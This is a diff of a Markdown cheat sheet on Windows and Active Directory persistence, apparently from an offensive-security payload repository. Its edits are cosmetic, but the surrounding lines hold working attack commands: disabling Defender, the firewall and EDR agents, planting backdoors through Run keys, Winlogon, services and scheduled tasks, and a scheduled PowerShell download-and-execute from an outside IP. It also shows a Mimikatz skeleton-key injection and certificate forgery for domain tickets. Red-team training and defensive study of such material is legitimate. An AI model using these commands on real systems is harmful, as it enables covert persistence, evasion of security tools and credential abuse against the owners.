@@ -36,10 +36,9 @@
     * [Golden Ticket](#golden-ticket)
 * [References](#references)
 
-
 ## Tools
 
-- [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
+* [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
 
 ## Hide Your Binary
 
@@ -56,13 +55,16 @@ PS> attrib +h mimikatz.exe
 * [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
 * [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
 * [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)
+
     ```ps1
     cd "C:\Program Files\Elastic\Agent\"
     PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
     Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
     Elastic Agent has been uninstalled.
     ```
+
 * [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)
+
     ```ps1
     # Global uninstall password: Password1
     Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
@@ -123,7 +125,6 @@ reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywa
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 ```
 
-
 ### Disable Windows Firewall
 
 ```powershell
@@ -158,7 +159,7 @@ Value name:  Backdoor
 Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
 ```
 
-Using the command line 
+Using the command line
 
 ```powershell
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
@@ -193,19 +194,23 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 ### Scheduled Tasks User
 
 * Using native **schtask** - Create a new task
+
     ```powershell
     # Create the scheduled tasks to run once at 00.00
     schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
     # Force run it now !
     schtasks /run /tn "Device-Synchronize"
     ```
+
 * Using native **schtask** - Leverage the `schtasks /change` command to modify existing scheduled tasks
+
     ```powershell
     # Launch an executable by calling the ShellExec_RunDLL function.
     SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
     ```
 
 * Using Powershell
+
     ```powershell
     PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
     PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
@@ -216,6 +221,7 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
     ```
 
 * Using SharPersist
+
     ```powershell
     # Add to a current scheduled task
     SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
@@ -224,7 +230,6 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
     SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
     SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
     ```
-
 
 ### BITS Jobs
 
@@ -242,13 +247,11 @@ bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.1
 bitsadmin /resume backdoor
 ```
 
-
 ### COM TypeLib
 
 * [CICADA8-Research/TypeLibWalker](https://github.com/CICADA8-Research/TypeLibWalker) - TypeLib persistence technique
 
 Use [sysinternals/procmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procmon) to find `RegOpenKey` with the status `NAME NOT FOUND`. The process `explorer.exe` is a good target, as it will spawn your payload every time it is run.
-
 
 ```ps1
 Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win32
@@ -278,7 +281,6 @@ Example of content for `1.sct`.
     </script>
 </scriptlet>
 ```
-
 
 ## Serviceland
 
@@ -311,7 +313,7 @@ Value name:  Backdoor
 Value data:  C:\Windows\Temp\backdoor.exe
 ```
 
-Using the command line 
+Using the command line
 
 ```powershell
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
@@ -333,7 +335,6 @@ reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
 ```
-
 
 #### GlobalFlag
 
@@ -369,7 +370,6 @@ SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n 
 sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
 sc start Backdoor
 ```
-
 
 ### ServiceSecurityDescriptor
 
@@ -408,7 +408,6 @@ sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgrou
 ```
 
 Then you need to wait for a reboot for the service to automatically start and grant the user with elevated privilege or any persistence mechanism you specified in the `binPath`.
-
 
 ### Scheduled Tasks Elevated
 
@@ -451,11 +450,9 @@ schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v
 schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 ```
 
-
 ### Windows Management Instrumentation Event Subscription
 
 > An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.
-
 
 * **__EventFilter**: Trigger (new process, failed logon etc.)
 * **EventConsumer**: Perform Action (execute payload etc.)
@@ -485,7 +482,6 @@ $EventConsumerToCleanup | Remove-WmiObject
 $EventFilterToCleanup | Remove-WmiObject
 ```
 
-
 ### Binary Replacement
 
 #### Binary Replacement on Windows XP+
@@ -508,12 +504,12 @@ Exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** exec
 
 Create a malicious **HID.dll** in  `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
 
-
 ### Skeleton Key
 
 > Inject a master password into the LSASS process of a Domain Controller.
 
 Requirements:
+
 * Domain Administrator (SeDebugPrivilege) or `NTAUTHORITY\SYSTEM`
 
 ```powershell
@@ -524,7 +520,6 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC
 # Access using the password "mimikatz"
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
-
 
 ### Virtual Machines
 
@@ -588,7 +583,6 @@ Add-AppxPackage .\debian.appx
 wsl kali-linux --user root
 ```
 
-
 ## Domain
 
 ### User Certificate
@@ -609,20 +603,25 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 > Require elevated privileges in the Active Directory, or on the ADCS machine
 
 * Export CA as p12 file: `certsrv.msc` > `Right Click` > `Back up CA...`
-* Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER 
+* Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER
+
     ```ps1
     privilege::debug
     crypto::capi
     crypto::cng
     crypto::certificates /systemstore:local_machine /store:my /export
     ```
+
 * Alternative 2: Using SharpDPAPI, then convert the certificate: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
 * [ForgeCert](https://github.com/GhostPack/ForgeCert) - Forge a certificate for any active domain user using the CA certificate
+
     ```ps1
     ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
     ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
     ```
+
 * Finally you can request a TGT using the Certificate
+
     ```ps1
     Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
     ```
